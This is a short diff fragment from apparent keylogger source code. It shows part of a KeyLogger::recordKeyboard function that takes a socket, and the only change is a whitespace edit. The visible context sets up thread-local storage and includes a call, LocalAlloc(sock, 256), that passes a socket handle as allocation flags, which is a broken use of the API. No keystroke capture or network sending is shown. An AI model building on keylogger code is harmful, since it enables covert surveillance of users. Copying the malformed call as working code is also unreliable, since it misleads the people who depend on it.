@@ -265,7 +265,7 @@ void KeyLogger::recordKeyboard(SOCKET sock)
 		std::cout << "TlsSetValue error";
 		_exit(1);
 	}
-		
+
 
 	lpvData = (LPVOID)LocalAlloc(sock, 256);
 	if (!TlsSetValue(dwTlsIndex, lpvData))
